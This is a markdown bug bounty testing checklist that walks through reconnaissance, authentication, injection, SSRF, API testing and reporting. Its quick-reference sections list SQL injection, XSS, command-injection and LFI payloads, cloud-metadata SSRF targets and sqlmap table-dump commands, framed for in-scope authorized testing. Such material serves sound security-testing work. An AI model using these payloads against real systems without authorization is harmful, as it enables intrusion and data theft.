# Bug Bounty Testing Checklist - Quick Reference

**Quick-access testing checklist for during active testing**

**Print this out or keep it open while testing!**

---

## Pre-Testing Checklist

- [ ] Scope document read and understood
- [ ] In-scope domains identified
- [ ] Out-of-scope systems identified
- [ ] Testing restrictions understood
- [ ] VPN/proxy configured if needed
- [ ] Burp Suite proxy configured
- [ ] Browser set to use proxy
- [ ] Testing start time logged

---

## Phase 1: Quick Reconnaissance (30 mins)

### Subdomain Enumeration
```bash
subfinder -d target.com -all -o subs.txt
httpx -l subs.txt -o alive_subs.txt
```
- [ ] Subdomains enumerated
- [ ] Alive subdomains identified
- [ ] Takeover vulnerabilities checked

### Technology Stack
```bash
whatweb target.com
# Use Wappalyzer browser extension
```
- [ ] Framework identified
- [ ] Server version identified
- [ ] Known vulnerable versions?

### Directory Discovery
```bash
feroxbuster -u https://target.com -w /usr/share/wordlists/dirb/common.txt
```
- [ ] Common directories found
- [ ] Admin panels identified
- [ ] API endpoints found

### Burp Suite Setup
- [ ] Proxy configured
- [ ] Scope set
- [ ] Passive scanning enabled
- [ ] Site crawled

---

## Phase 2: Authentication Testing (20 mins)

### Login Form
- [ ] Brute force rate limiting tested
- [ ] Account enumeration tested
- [ ] Weak password policy tested
- [ ] Password reset tested

### Session Management
- [ ] Session token generation (predictable?)
- [ ] Session timeout tested
- [ ] Logout functionality tested
- [ ] Cookie attributes checked (HttpOnly, Secure, SameSite)

### MFA (if present)
- [ ] MFA bypass attempts
- [ ] Response manipulation tested
- [ ] Status code manipulation tested
- [ ] Backup codes tested

---

## Phase 3: Authorization Testing (20 mins)

### IDOR Testing
```
/user/profile/123 → try /user/profile/124
/api/documents/abc → try /api/documents/abd
```
- [ ] User-specific resources identified
- [ ] Sequential ID enumeration tested
- [ ] UUID enumeration tested
- [ ] Parameter manipulation tested

### Privilege Escalation
- [ ] Admin features tested with regular user
- [ ] Role parameter manipulation tested
- [ ] Permission bypass tested

---

## Phase 4: Injection Testing (45 mins)

### SQL Injection
```sql
' OR '1'='1
' OR 1=1 --
' UNION SELECT NULL,NULL,NULL --
```
- [ ] All input fields tested
- [ ] GET parameters tested
- [ ] POST parameters tested
- [ ] Headers tested (User-Agent, Cookie)
- [ ] Blind SQLi tested (time-based)

**SQLMap Quick:**
```bash
sqlmap -u "https://target.com/page?id=1" --dbs
```

### Cross-Site Scripting (XSS)
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```
- [ ] Reflected XSS tested
- [ ] Stored XSS tested
- [ ] DOM-based XSS tested
- [ ] Encoding bypass tested
- [ ] All input fields tested

### Command Injection
```bash
; id
| whoami
$(whoami)
```
- [ ] Ping functionality tested
- [ ] DNS lookup tested
- [ ] File operations tested
- [ ] Blind command injection tested

### File Inclusion (LFI/RFI)
```
../../../etc/passwd
php://filter/convert.base64-encode/resource=index.php
```
- [ ] Path traversal tested
- [ ] Null byte injection tested
- [ ] Wrapper protocols tested
- [ ] RFI tested (if enabled)

### File Upload
- [ ] Client-side validation bypassed
- [ ] Magic byte manipulation tested
- [ ] Extension bypass tested (.php.jpg, .phtml)
- [ ] Content-Type manipulation tested
- [ ] Uploaded file execution tested

---

## Phase 5: Business Logic Testing (30 mins)

### CSRF
- [ ] State-changing operations identified
- [ ] CSRF token presence checked
- [ ] Token validation tested
- [ ] Sensitive operations tested (password change, fund transfer)

### SSRF
```
http://localhost/admin
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/
```
- [ ] URL fetching functionality tested
- [ ] Internal resource access tested
- [ ] Cloud metadata tested
- [ ] Port scanning tested

### Open Redirects
```
http://attacker.com
//attacker.com
javascript:alert('XSS')
```
- [ ] Redirect parameters identified
- [ ] Redirect bypass tested
- [ ] Chaining with other vulns tested

### Business Logic Flaws
- [ ] Price manipulation tested
- [ ] Quantity bypass tested (negative, zero)
- [ ] Coupon abuse tested
- [ ] Workflow bypass tested
- [ ] Race conditions tested (concurrent requests)

---

## Phase 6: Configuration & Deployment (15 mins)

### Security Headers
```bash
curl -I https://target.com | grep -i "content-security-policy\|x-frame-options\|hsts"
```
- [ ] CSP missing or weak
- [ ] X-Frame-Options missing
- [ ] HSTS missing
- [ ] X-Content-Type-Options missing

### TLS/SSL
- [ ] Certificate validity checked
- [ ] Weak ciphers tested
- [ ] SSL downgrade tested

### CORS
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
- [ ] CORS policy checked
- [ ] CORS bypass tested

### Information Disclosure
- [ ] API keys in JavaScript
- [ ] Internal IPs in errors
- [ ] Database connection strings
- [ ] Source code disclosure
- [ ] Backup files (.bak, .old, .zip)

---

## Phase 7: API Testing (if applicable) (20 mins)

### API Authentication
- [ ] API key validation tested
- [ ] Token expiration tested
- [ ] Token reuse tested
- [ ] API key location tested (header, query, body)

### API Rate Limiting
- [ ] Rate limit bypass tested
- [ ] Concurrent requests tested

### GraphQL (if applicable)
- [ ] Introspection enabled?
- [ ] Query complexity tested
- [ ] Mutation authorization tested

---

## Vulnerability Severity Quick Reference

| Severity | CVSS | Examples |
|----------|------|----------|
| **Critical** | 9.0-10.0 | RCE, Auth bypass, Data breach |
| **High** | 7.0-8.9 | SQLi, Stored XSS, IDOR |
| **Moderate** | 4.0-6.9 | Reflected XSS, Weak headers |
| **Low** | 0.1-3.9 | Info disclosure, Missing headers |
| **Informational** | N/A | Best practices, observations |

---

## Common Payloads Quick Reference

### XSS Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

### SQLi Payloads
```sql
' OR '1'='1
' OR 1=1 --
' OR 1=1 /*
admin' --
' UNION SELECT NULL,NULL,NULL --
' AND SLEEP(5) --
```

### Command Injection Payloads
```bash
; id
| whoami
|| whoami
& whoami
&& whoami
`whoami`
$(whoami)
; sleep 5
```

### LFI Payloads
```
../../../etc/passwd
../../etc/passwd
/etc/passwd
../../../etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
```

### SSRF Payloads
```
http://localhost/admin
http://127.0.0.1:8080
http://192.168.1.1
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal
```

---

## Tools Quick Commands

### Subdomain Enumeration
```bash
subfinder -d target.com -all
amass enum -d target.com
assetfinder --subs-only target.com
```

### Directory Discovery
```bash
gobuster dir -u https://target.com -w wordlist.txt
feroxbuster -u https://target.com -w wordlist.txt
```

### SQL Injection
```bash
sqlmap -u "https://target.com/page?id=1" --dbs
sqlmap -u "https://target.com/page?id=1" -D db_name --tables
sqlmap -u "https://target.com/page?id=1" -D db_name -T table_name --dump
```

### Technology Detection
```bash
whatweb target.com
curl -I https://target.com
```

### HTTP Probing
```bash
httpx -l urls.txt
curl -I https://target.com | grep -i "server\|x-powered-by"
```

---

## Burp Suite Quick Tips

### Repeater
- [ ] Modify requests manually
- [ ] Test parameter changes
- [ ] Test header manipulation

### Intruder
- [ ] Fuzzing parameters
- [ ] Brute forcing IDs
- [ ] Testing multiple payloads

### Decoder
- [ ] Encode/decode payloads
- [ ] Base64 encoding
- [ ] URL encoding

### Comparer
- [ ] Compare responses
- [ ] Identify differences
- [ ] Spot information leaks

---

## Reporting Checklist

Before submitting report:
- [ ] Vulnerability reproducible
- [ ] In-scope confirmed
- [ ] Not already reported
- [ ] PoC doesn't cause damage
- [ ] Clear reproduction steps
- [ ] Screenshots/video included
- [ ] Impact clearly explained
- [ ] CVSS score calculated
- [ ] Remediation provided
- [ ] References included (OWASP, CWE, CVE)

---

## Testing Time Allocation (for 8-hour testing day)

- Reconnaissance: 30 mins
- Authentication: 20 mins
- Authorization: 20 mins
- Injection: 45 mins
- Business Logic: 30 mins
- Configuration: 15 mins
- API Testing: 20 mins
- Reporting/Documentation: 60 mins
- Buffer/Additional Testing: 60 mins

**Total: 8 hours**

---

## Common False Positives to Avoid

- [ ] Reflected user input in error messages (not always XSS)
- [ ] CORS headers with specific origin (not always exploitable)
- [ ] Verbose error messages (not always critical)
- [ ] Old technology versions (verify if actually vulnerable)
- [ ] Security headers in development (check production)

---

## Red Flags / High-Priority Areas

- [ ] No CSRF tokens on state-changing operations
- [ ] User input directly in SQL queries
- [ ] Direct object references without authorization
- [ ] File upload without validation
- [ ] Verbose error messages revealing internals
- [ ] Missing security headers
- [ ] Weak authentication mechanisms
- [ ] Unencrypted sensitive data transmission

---

## Post-Testing Checklist

- [ ] All findings documented
- [ ] Screenshots/PoCs captured
- [ ] CVSS scores calculated
- [ ] Remediation recommendations written
- [ ] References gathered
- [ ] Report proofread
- [ ] No sensitive data in report
- [ ] Ready to submit

---

**Keep this checklist handy during testing!**

**Print it out or bookmark it for quick reference.**

**Last Updated:** January 2026
